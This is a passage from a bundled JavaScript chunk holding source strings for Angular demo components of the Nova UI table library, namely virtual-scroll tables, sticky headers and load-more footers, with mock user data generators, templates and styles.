each item in the table\n    public trackByNo: TrackByFunction<IRandomUserTableModel> = (\n        index: number,\n        item: IRandomUserTableModel\n    ): number => item?.no;\n\n    constructor(\n        public dataSourceService: ClientSideDataSource<IRandomUserTableModel>\n    ) {\n        // Note: Initiating data source with data to be displayed\n        this.dataSourceService.setData(generateUsers(100000));\n    }\n\n    public ngAfterViewInit(): void {\n        this.dataSourceService.componentTree = {\n            // Note: Using paginator as filter to be able to get specific range\n            paginator: {\n                componentInstance: {\n                    getFilters: () => ({\n                        value: this.viewport.getRenderedRange(),\n                    }),\n                },\n            },\n        };\n\n        // Note: Creating a stream of visible items to be bound to the table and increase the performance\n        this.visibleItems$ = this.viewport.renderedRangeStream.pipe(\n            // eslint-disable-next-line import/no-deprecated\n            startWith({ start: 0, end: 10 }),\n            // Note: On range change applying filters\n            tap(async () => this.dataSourceService.applyFilters()),\n            // Subscribing to the filter results transforming and merging them into the stream\n            // eslint-disable-next-line import/no-deprecated\n            switchMap(() =>\n                this.dataSourceService.outputsSubject.pipe(\n                    map((result: IFilteringOutputs) => {\n                        // Updating mock items list\n                        if (\n                            this.placeholderItems.length !==\n                            result.paginator.total\n                        ) {\n                            this.placeholderItems = Array.from({\n                                length: result.paginator.total,\n                            });\n                        }\n                        // Mapping the values to array to be able to bind them to the table dataSource\n                        return result.repeat.itemsSource;\n                    })\n                )\n            )\n        );\n    }\n}\n\nconst PEOPLE = [\n    "Elena",\n    "Madelyn",\n    "Baggio",\n    "Josh",\n    "Lukas",\n    "Blake",\n    "Frantz",\n    "Dima",\n    "Serhii",\n    "Vita",\n    "Vlad",\n    "Ivan",\n    "Dumitru",\n];\nconst CITIES = [\n    "Bucharest",\n    "Kiev",\n    "Austin",\n    "Brno",\n    "Frankfurt pe Main",\n    "Sutton-under-Whitestonecliffe",\n    "Vila Bela da Sant\xedssima Trindade",\n];\nfunction generateUsers(length: number): IRandomUserTableModel[] {\n    return Array.from({ length }).map((obj: unknown, id: number) => {\n        const personName = sample(PEOPLE) || PEOPLE[0];\n        return {\n            no: id,\n            postcode: id * 1000000 * id,\n            city: sample(CITIES) || CITIES[0],\n            nameFirst: personName,\n            nameLast: "UnknownLast",\n        };\n    });\n}\n'},64451:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="mb-3">\n    <div class="row">\n        <div class="col-3">Sticky footer:</div>\n    </div>\n    <div class="row">\n        <div class="col-3">\n            <nui-switch [(value)]="makeSticky" i18n>\n                {{ makeSticky ? "Sticky" : "Not Sticky" }}\n            </nui-switch>\n        </div>\n    </div>\n</div>\n\n<div [style.height.px]="gridHeight" [style.max-width.px]="1300">\n    <cdk-virtual-scroll-viewport\n        class="h-100"\n        [itemSize]="24"\n        #viewport\n        [tableStickyHeader]="makeSticky"\n    >\n        <table\n            nui-table\n            [dataSource]="\n                users | async | sliceRange : viewport.getRenderedRange()\n            "\n            [resizable]="false"\n            [reorderable]="true"\n        >\n            <ng-container nuiColumnDef="no" [columnWidth]="50">\n                <th nui-header-cell *nuiHeaderCellDef i18n>No.</th>\n                <td nui-cell *nuiCellDef="let element">{{ element.no }}</td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="nameTitle" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Title</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element.nameTitle }}\n                </td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="nameFirst" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>First Name</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element.nameFirst }}\n                </td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="nameLast" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Last Name</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element.nameLast }}\n                </td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="gender" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Gender</th>\n                <td nui-cell *nuiCellDef="let element">{{ element.gender }}</td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="country" [columnWidth]="150">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Country</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element.country }}\n                </td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="city" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>City</th>\n                <td nui-cell *nuiCellDef="let element">{{ element.city }}</td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="postcode" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Postcode</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element.postcode }}\n                </td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="email" [columnWidth]="200">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Email</th>\n                <td nui-cell *nuiCellDef="let element">{{ element.email }}</td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="cell" [columnWidth]="150">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Cell</th>\n                <td\n                    nui-cell\n                    *nuiCellDef="let element"\n                    style="overflow: visible"\n                >\n                    {{ element.cell }}\n                </td>\n            </ng-container>\n\n            <tr nui-header-row *nuiHeaderRowDef="displayedColumns"></tr>\n            <ng-template\n                nuiRowDef\n                cdkVirtualFor\n                [nuiRowDefColumns]="displayedColumns"\n                [cdkVirtualForOf]="users"\n            >\n                <tr nui-row density="tiny"></tr>\n            </ng-template>\n        </table>\n        <div *ngIf="!makeSticky">\n            <ng-container *ngTemplateOutlet="footer"></ng-container>\n        </div>\n    </cdk-virtual-scroll-viewport>\n</div>\n<div *ngIf="makeSticky">\n    <ng-container *ngTemplateOutlet="footer"></ng-container>\n</div>\n\n<ng-template #footer>\n    <footer class="nui-demo-scrolling-footer mt-1">\n        <div class="h-100 w-100">\n            <div\n                *ngIf="isBusy; else defaultText"\n                class="d-flex justify-content-center align-items-center"\n            >\n                <nui-spinner\n                    class="mr-2 d-inline-flex"\n                    [show]="isBusy"\n                    size="small"\n                ></nui-spinner>\n                <span>Loading next {{ itemsToLoad }} items...</span>\n            </div>\n            <ng-template #defaultText>\n                <div\n                    class="h-100 d-flex justify-content-center align-items-center"\n                >\n                    Showing\n                    <span class="px-2">\n                        {{ users.value.length }}\n                    </span>\n                    of\n                    <span class="pl-2">\n                        {{ totalItems }}\n                    </span>\n                    <span\n                        *ngIf="\n                            users.value.length !== totalItems;\n                            else endOfData\n                        "\n                        >.\n                    </span>\n\n                    <div\n                        *ngIf="isChunkLoaded() && !isAllLoaded()"\n                        class="d-flex justify-content-center"\n                    >\n                        <button\n                            btn\n                            nui-button\n                            type="button"\n                            size="compact"\n                            displayStyle="action"\n                            (click)="loadMore()"\n                        >\n                            <div class="px-2">\n                                Load\n                                {{\n                                    totalItems - loadedItems < itemsToLoad\n                                        ? "last"\n                                        : "next"\n                                }}\n                                {{\n                                    totalItems - loadedItems < itemsToLoad\n                                        ? totalItems - loadedItems\n                                        : itemsToLoad\n                                }}\n                                items\n                            </div>\n                        </button>\n                    </div>\n                </div>\n                <ng-template #endOfData\n                    ><strong>. All items loaded.</strong></ng-template\n                >\n            </ng-template>\n        </div>\n    </footer>\n</ng-template>\n'},27207:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-typography.less";\n@import (reference) "nui-framework-variables";\n@import (reference) "mixins";\n\n.nui-demo-scrolling-footer {\n    .setCssVariable(background-color, nui-color-bg-transparent);\n    .setCssVariable(color, nui-color-text-secondary);\n    height: 24px;\n    border: 1px solid;\n    .setCssVariable(border-color, nui-color-line-default);\n    max-width: 1285px;\n    .nui-text-small-secondary();\n}\n'},57691:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    ChangeDetectionStrategy,\n    ChangeDetectorRef,\n    Component,\n    OnDestroy,\n    OnInit,\n} from "@angular/core";\nimport { BehaviorSubject } from "rxjs";\n\nimport {\n    IFilteringOutputs,\n    SearchService,\n    SelectorService,\n} from "@nova-ui/bits";\n\nimport { IRandomUserTableModel } from "../index";\nimport { RandomuserTableDataSource1 } from "../table-virtual-scroll-datasource-1";\n\n@Component({\n    selector: "nui-table-virtual-scroll-steps-and-button-example",\n    templateUrl:\n        "./table-virtual-scroll-steps-and-button.example.component.html",\n    styleUrls: [\n        "./table-virtual-scroll-steps-and-button.example.component.less",\n    ],\n    changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class TableVirtualScrollStepsAndButtonExampleComponent\n    implements OnDestroy, OnInit\n{\n    // This value is obtained from the server and used to evaluate the total number of pages to display\n    private _loadedItems: number = 0;\n    private _isBusy: boolean = false;\n\n    get loadedItems(): number {\n        return this._loadedItems;\n    }\n    get isBusy(): boolean {\n        return this._isBusy;\n    }\n\n    // The dynamically changed array of items to render by the table\n    public users = new BehaviorSubject<IRandomUserTableModel[]>([]);\n\n    public displayedColumns: string[] = [\n        "no",\n        "nameTitle",\n        "nameFirst",\n        "nameLast",\n        "gender",\n        "country",\n        "city",\n        "postcode",\n        "email",\n        "cell",\n    ];\n\n    public gridHeight = 400;\n    public makeSticky: boolean = true;\n    public step: number = 100;\n    public itemsToLoad: number = 500;\n    public totalItems: number = 0;\n\n    private dataSource: RandomuserTableDataSource1;\n\n    constructor(\n        public selectorService: SelectorService,\n        private cd: ChangeDetectorRef,\n        private searchService: SearchService\n    ) {\n        this.dataSource = new RandomuserTableDataSource1(searchService);\n        this.dataSource.step.next(this.step);\n        this.dataSource.itemsToLoad.next(this.itemsToLoad);\n    }\n\n    public ngOnInit(): void {\n        this.dataSource.outputsSubject.subscribe(\n            (outputs: IFilteringOutputs) => {\n                if (!outputs) {\n                    return;\n                }\n\n                this.users.next(outputs.repeat.itemsSource);\n                this._loadedItems = outputs.itemsToLoad;\n                this.totalItems = outputs.totalItems;\n                this.dataSource.step.next(this.step);\n\n                /**\n                 * Option 1:\n                 * When Option 2 code snippet (see below) is commented out, and the following one is uncommented,\n                 * lets the table to load all available items in API step by step without user interaction.\n                 */\n\n                // if (this.users.value.length < this.totalItems) {\n                //     this.loadAll();\n                // }\n\n                /**\n                 * Option 2:\n                 * When Option 1 code snippet (see above) is commented out, and the following one is uncommented,\n                 * lets the table ot load only the amount of items set in the ${itemsToLoad} variable. Requires user action to fetch another chunk of data.\n                 */\n                if (this.users.value.length < this.loadedItems) {\n                    const leftover =\n                        this.users.value.length -\n                        this.itemsToLoad *\n                            Math.round(\n                                this.users.value.length / this.itemsToLoad\n                            );\n                    if (this.step > Math.abs(leftover)) {\n                        this.dataSource.step.next(this.itemsToLoad % this.step);\n                    }\n                    this.dataSource.applyFilters();\n                }\n\n                this.cd.detectChanges();\n            }\n        );\n        this.dataSource.applyFilters();\n\n        this.dataSource.busy.subscribe((busy) => {\n            this._isBusy = busy;\n        });\n    }\n\n    public ngOnDestroy(): void {\n        this.dataSource.busy.unsubscribe();\n        this.dataSource.outputsSubject.unsubscribe();\n        this.users.complete();\n    }\n\n    public loadAll(): void {\n        const delta = this.totalItems - this.users.value.length;\n\n        if (this.step > delta) {\n            this.dataSource.step.next(delta);\n        }\n        this.dataSource.applyFilters();\n    }\n\n    public loadMore(): void {\n        const toLoad = Math.min(\n            this.totalItems - this.loadedItems,\n            this.itemsToLoad\n        );\n        if (toLoad < this.itemsToLoad) {\n            this.dataSource.step.next(toLoad);\n        }\n        this.dataSource.itemsToLoad.next(this.loadedItems + toLoad);\n        this.dataSource.applyFilters();\n    }\n\n    public isAllLoaded(): boolean {\n        return (\n            this.users.value.length === this.totalItems &&\n            this.users.value.length !== 0\n        );\n    }\n\n    public isChunkLoaded(): boolean {\n        return (\n            this.users.value.length === this.loadedItems &&\n            this.users.value.length !== 0\n        );\n    }\n}\n'},91900:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="row mb-2">\n    <div class="col-3">\n        <nui-switch\n            [value]="makeSticky"\n            (valueChange)="updateStickyState($event)"\n            i18n\n        >\n            {{ makeSticky ? "Sticky" : "Not Sticky" }}\n        </nui-switch>\n    </div>\n</div>\n\n<div\n    id="nui-demo-table-sticky-header"\n    [style.height.px]="gridHeight"\n    [style.max-width.px]="1300"\n>\n    <cdk-virtual-scroll-viewport\n        tableStickyHeader\n        class="h-100"\n        [itemSize]="itemSize"\n    >\n        \x3c!-- IMPORTANT Bind only visible rows to the table, otherwise, the table will render all rows in the DOM --\x3e\n        <table\n            nui-table\n            [dataSource]="visibleItems$ | async"\n            [trackBy]="trackByNo"\n            [sortable]="true"\n        >\n            \x3c!-- ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ --\x3e\n            <ng-container\n                *ngFor="let column of displayedColumns"\n                [nuiColumnDef]="column"\n                [type]="column === \'icon\' ? \'icon\' : \'default\'"\n            >\n                <th nui-header-cell *nuiHeaderCellDef>\n                    <span *ngIf="column !== \'icon\'; else headerIcon">{{\n                        column\n                    }}</span>\n                    <ng-template #headerIcon>\n                        <div\n                            class="d-flex align-items-center justify-content-center"\n                        >\n                            <nui-icon icon="enable"></nui-icon>\n                        </div>\n                    </ng-template>\n                </th>\n                <td nui-cell *nuiCellDef="let element">\n                    <span *ngIf="column !== \'icon\'; else icon">{{\n                        element[column]\n                    }}</span>\n                    <ng-template #icon>\n                        <div\n                            class="d-flex align-items-center justify-content-center"\n                        >\n                            <nui-icon [icon]="element[column]"></nui-icon>\n                        </div>\n                    </ng-template>\n                </td>\n            </ng-container>\n\n            <tr nui-header-row *nuiHeaderRowDef="displayedColumns"></tr>\n            \x3c!-- IMPORTANT The actual difference between normal table and virtualized one--\x3e\n            \x3c!-- \u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228 --\x3e\n            <ng-template\n                nuiRowDef\n                cdkVirtualFor\n                let-context\n                [nuiRowDefColumns]="displayedColumns"\n                [cdkVirtualForOf]="placeholderItems"\n                [cdkVirtualForTrackBy]="trackByNo"\n            >\n                <tr nui-row [rowObject]="context"></tr>\n            </ng-template>\n            \x3c!-- ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ --\x3e\n        </table>\n    </cdk-virtual-scroll-viewport>\n</div>\n'},89612:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { CdkVirtualScrollViewport } from "@angular/cdk/scrolling";\nimport {\n    AfterViewInit,\n    ChangeDetectionStrategy,\n    Component,\n    TrackByFunction,\n    ViewChild,\n} from "@angular/core";\nimport { Observable } from "rxjs";\n// eslint-disable-next-line import/no-deprecated\nimport { map, startWith, switchMap, tap } from "rxjs/operators";\n\nimport {\n    ClientSideDataSource,\n    IFilteringOutputs,\n    TableStickyHeaderDirective,\n} from "@nova-ui/bits";\n\ninterface IRandomUserTableModel {\n    no: number;\n    icon: string;\n    nameFirst: string;\n    nameLast: string;\n    city: string;\n    postcode: number;\n}\n\n@Component({\n    selector: "nui-table-virtual-scroll-sticky-header-test-example",\n    templateUrl:\n        "./table-virtual-scroll-sticky-header-test-example.component.html",\n    changeDetection: ChangeDetectionStrategy.OnPush,\n    providers: [ClientSideDataSource],\n})\nexport class TableVirtualScrollStickyHeaderTestExampleComponent\n    implements AfterViewInit\n{\n    @ViewChild(CdkVirtualScrollViewport)\n    public viewport: CdkVirtualScrollViewport;\n    // Note: Used only for demo purposes\n    @ViewChild(TableStickyHeaderDirective)\n    public stickyHeaderDirective: TableStickyHeaderDirective;\n\n    // Note: Mock items list is used to fake that the data is already loaded\n    // and let CDK Viewport perform the scrolling on a known number of items\n    public placeholderItems: undefined[] = [];\n    public visibleItems$: Observable<IRandomUserTableModel[]>;\n    // The dynamically changed array of items to render by the table\n    public displayedColumns: string[] = [\n        "no",\n        "icon",\n        "nameFirst",\n        "nameLast",\n        "city",\n        "postcode",\n    ];\n\n    public makeSticky: boolean = true;\n    public itemSize: number = 40;\n    public gridHeight = 400;\n    // trackBy handler used to identify uniquely each item in the table\n    public trackByNo: TrackByFunction<IRandomUserTableModel> = (\n        index: number,\n        item: IRandomUserTableModel\n    ): number => item?.no;\n\n    constructor(\n        public dataSourceService: ClientSideDataSource<IRandomUserTableModel>\n    ) {\n        // Note: Initiating data source with data to be displayed\n        this.dataSourceService.setData(generateUsers(100000));\n    }\n\n    public ngAfterViewInit(): void {\n        this.dataSourceService.componentTree = {\n            // Note: Using paginator as filter to be able to get specific range\n            paginator: {\n                componentInstance: {\n                    getFilters: () => ({\n                        value: this.viewport.getRenderedRange(),\n                    }),\n                },\n            },\n        };\n\n        // Note: Creating a stream of visible items to be bound to the table and increase the performance\n        this.visibleItems$ = this.viewport.renderedRangeStream.pipe(\n            // eslint-disable-next-line import/no-deprecated\n            startWith({ start: 0, end: 10 }),\n            // Note: On range change applying filters\n            tap(async () => this.dataSourceService.applyFilters()),\n            // Subscribing to the filter results transforming and merging them into the stream\n            // eslint-disable-next-line import/no-deprecated\n            switchMap(() =>\n                this.dataSourceService.outputsSubject.pipe(\n                    map((result: IFilteringOutputs) => {\n                        // Updating mock items list\n                        if (\n                            this.placeholderItems.length !==\n                            result.paginator.total\n                        ) {\n                            this.placeholderItems = Array.from({\n                                length: result.paginator.total,\n                            });\n                        }\n                        // Mapping the values to array to be able to bind them to the table dataSource\n                        return result.repeat.itemsSource;\n                    })\n                )\n            )\n        );\n    }\n\n    // Note: Used only for demo purposes\n    public updateStickyState(state: boolean): void {\n        this.stickyHeaderDirective.tableStickyHeader = state;\n        this.makeSticky = state;\n    }\n}\n\nconst PEOPLE = [\n    "Elena",\n    "Madelyn",\n    "Baggio",\n    "Josh",\n    "Lukas",\n    "Blake",\n    "Frantz",\n    "Dima",\n    "Serhii",\n    "Vita",\n    "Vlad",\n    "Ivan",\n    "Dumitru",\n];\nconst CITIES = [\n    "Bucharest",\n    "Kiev",\n    "Austin",\n    "Brno",\n    "Frankfurt pe Main",\n    "Sutton-under-Whitestonecliffe",\n    "Vila Bela da Sant\xedssima Trindade",\n];\nconst ICONS = ["status_up", "status_unplugged"];\n\nfunction generateUsers(length: number): IRandomUserTableModel[] {\n    let peopleIndex = 0;\n    let citiesIndex = 0;\n\n    return Array.from({ length }).map((obj: unknown, no: number) => {\n        const nameFirst = PEOPLE[peopleIndex];\n        const city = CITIES[citiesIndex];\n\n        // wrap indexes when we reach the last one\n        peopleIndex = (peopleIndex + 1) % PEOPLE.length;\n        citiesIndex = (citiesIndex + 1) % CITIES.length;\n\n        return {\n            no,\n            icon: ICONS[no % 2],\n            nameFirst,\n            nameLast: "UnknownLast",\n            city,\n            postcode: 1000000,\n        };\n    });\n}\n'},76554:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="row mb-2">\n    <div class="col-3">\n        <nui-switch\n            [value]="makeSticky"\n            (valueChange)="updateStickyState($event)"\n            i18n\n        >\n            {{ makeSticky ? "Sticky" : "Not Sticky" }}\n        </nui-switch>\n    </div>\n</div>\n\n<div\n    id="nui-demo-table-sticky-header"\n    [style.height.px]="gridHeight"\n    [style.max-width.px]="1300"\n>\n    <cdk-virtual-scroll-viewport\n        tableStickyHeader\n        class="h-100"\n        [itemSize]="itemSize"\n    >\n        \x3c!-- IMPORTANT Bind only visible rows to the table, otherwise, the table will render all rows in the DOM --\x3e\n        <table\n            nui-table\n            [dataSource]="visibleItems$ | async"\n            [trackBy]="trackByNo"\n            [sortable]="true"\n        >\n            \x3c!-- ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ --\x3e\n            <ng-container\n                *ngFor="let column of displayedColumns"\n                [nuiColumnDef]="column"\n            >\n                <th nui-header-cell *nuiHeaderCellDef>{{ column }}</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element[column] }}\n                </td>\n            </ng-container>\n\n            <tr nui-header-row *nuiHeaderRowDef="displayedColumns"></tr>\n            \x3c!-- IMPORTANT The actual difference between normal table and virtualized one--\x3e\n            \x3c!-- \u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228 --\x3e\n            <ng-template\n                nuiRowDef\n                cdkVirtualFor\n                let-context\n                [nuiRowDefColumns]="displayedColumns"\n                [cdkVirtualForOf]="placeholderItems"\n                [cdkVirtualForTrackBy]="trackByNo"\n            >\n                <tr nui-row [rowObject]="context"></tr>\n            </ng-template>\n            \x3c!-- ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ --\x3e\n        </table>\n    </cdk-virtual-scroll-viewport>\n</div>\n'},83350:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { CdkVirtualScrollViewport } from "@angular/cdk/scrolling";\nimport {\n    AfterViewInit,\n    ChangeDetectionStrategy,\n    Component,\n    TrackByFunction,\n    ViewChild,\n} from "@angular/core";\nimport sample from "lodash/sample";\nimport { Observable } from "rxjs";\n// eslint-disable-next-line import/no-deprecated\nimport { map, startWith, switchMap, tap } from "rxjs/operators";\n\nimport {\n    ClientSideDataSource,\n    IFilteringOutputs,\n    TableStickyHeaderDirective,\n} from "@nova-ui/bits";\n\ninterface IRandomUserTableModel {\n    no: number;\n    nameFirst: string;\n    nameLast: string;\n    city: string;\n    postcode: number;\n}\n\n@Component({\n    selector: "nui-table-virtual-scroll-sticky-header-example",\n    templateUrl: "./table-virtual-scroll-sticky-header-example.component.html",\n    changeDetection: ChangeDetectionStrategy.OnPush,\n    providers: [ClientSideDataSource],\n})\nexport class TableVirtualScrollStickyHeaderExampleComponent\n    implements AfterViewInit\n{\n    @ViewChild(CdkVirtualScrollViewport)\n    public viewport: CdkVirtualScrollViewport;\n    // Note: Used only for demo purposes\n    @ViewChild(TableStickyHeaderDirective)\n    public stickyHeaderDirective: TableStickyHeaderDirective;\n\n    // Note: Mock items list is used to fake that the data is already loaded\n    // and let CDK Viewport perform the scrolling on a known number of items\n    public placeholderItems: undefined[] = [];\n    public visibleItems$: Observable<IRandomUserTableModel[]>;\n    // The dynamically changed array of items to render by the table\n    public displayedColumns: string[] = [\n        "no",\n        "nameFirst",\n        "nameLast",\n        "city",\n        "postcode",\n    ];\n\n    public makeSticky: boolean = true;\n    public itemSize: number = 40;\n    public gridHeight = 400;\n    // trackBy handler used to identify uniquely each item in the table\n    public trackByNo: TrackByFunction<IRandomUserTableModel> = (\n        index: number,\n        item: IRandomUserTableModel\n    ): number => item?.no;\n\n    constructor(\n        public dataSourceService: ClientSideDataSource<IRandomUserTableModel>\n    ) {\n        // Note: Initiating data source with data to be displayed\n        this.dataSourceService.setData(generateUsers(100000));\n    }\n\n    public ngAfterViewInit(): void {\n        this.dataSourceService.componentTree = {\n            // Note: Using paginator as filter to be able to get specific range\n            paginator: {\n                componentInstance: {\n                    getFilters: () => ({\n                        value: this.viewport.getRenderedRange(),\n                    }),\n                },\n            },\n        };\n\n        // Note: Creating a stream of visible items to be bound to the table and increase the performance\n        this.visibleItems$ = this.viewport.renderedRangeStream.pipe(\n            // eslint-disable-next-line import/no-deprecated\n            startWith({ start: 0, end: 10 }),\n            // Note: On range change applying filters\n            tap(async () => this.dataSourceService.applyFilters()),\n            // Subscribing to the filter results transforming and merging them into the stream\n            // eslint-disable-next-line import/no-deprecated\n            switchMap(() =>\n                this.dataSourceService.outputsSubject.pipe(\n                    map((result: IFilteringOutputs) => {\n                        // Updating mock items list\n                        if (\n                            this.placeholderItems.length !==\n                            result.paginator.total\n                        ) {\n                            this.placeholderItems = Array.from({\n                                length: result.paginator.total,\n                            });\n                        }\n                        // Mapping the values to array to be able to bind them to the table dataSource\n                        return result.repeat.itemsSource;\n                    })\n                )\n            )\n        );\n    }\n\n    // Note: Used only for demo purposes\n    public updateStickyState(state: boolean): void {\n        this.stickyHeaderDirective.tableStickyHeader = state;\n        this.makeSticky = state;\n    }\n}\n\nconst PEOPLE = [\n    "Elena",\n    "Madelyn",\n    "Baggio",\n    "Josh",\n    "Lukas",\n    "Blake",\n    "Frantz",\n    "Dima",\n    "Serhii",\n    "Vita",\n    "Vlad",\n    "Ivan",\n    "Dumitru",\n];\nconst CITIES = [\n    "Bucharest",\n    "Kiev",\n    "Austin",\n    "Brno",\n    "Frankfurt pe Main",\n    "Sutton-under-Whitestonecliffe",\n    "Vila Bela da Sant\xedssima Trindade",\n];\nfunction generateUsers(length: number): IRandomUserTableModel[] {\n    return Array.from({ length }).map((obj: unknown, id: number) => {\n        const personName = sample(PEOPLE) || PEOPLE[0];\n        return {\n            no: id,\n            postcode: id * 1000000 * id,\n            city: sample(CITIES) || CITIES[0],\n            nameFirst: personName,\n            nameLast: "UnknownLast",\n        };\n    });\n}\n'},81466:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <details open>\n        <summary id="nui-visual-table-basic-summary">Basic Usage</summary>\n        <nui-table-basic-example\n            id="table-basic-usage"\n        ></nui-table-basic-example>\n    </details>\n\n    <details open>\n        <summary id="nui-visual-table-pinned-summary">Pinned header</summary>\n        <nui-table-pinned-header-example\n            id="table-pinned-header"\n        ></nui-table-pinned-header-example>\n    </details>\n\n    <details open>\n        <summary id="nui-visual-table-alignment-summary">\n            Column Alignment\n        </summary>\n        <nui-table-cell-content-align-example\n            id="table-column-alignment"\n        ></nui-table-cell-content-align-example>\n    </details>\n\n    <details open>\n        <summary id="nui-visual-table-row-density-tiny-summary">\n            Row Density ("tiny")\n        </summary>\n        <nui-table-row-height-set\n            id="table-row-density-tiny"\n        ></nui-table-row-height-set>\n    </details>\n\n    <details open>\n        <summary id="nui-visual-table-row-density-compact-summary">\n            Row Density ("compact")\n        </summary>\n        <nui-table-row-height-set\n            id="table-row-density-compact"\n            density="compact"\n        ></nui-table-row-height-set>\n    </details>\n\n    <details open>\n        <summary id="nui-visual-table-sorting-summary">Sorting</summary>\n        <nui-table-sorting-example\n            id="table-sorting"\n        ></nui-table-sorting-example>\n    </details>\n\n    <details open>\n        <summary id="nui-visual-table-custom-action-summary">\n            Custom actions\n        </summary>\n        <nui-table-columns-add-remove-example\n            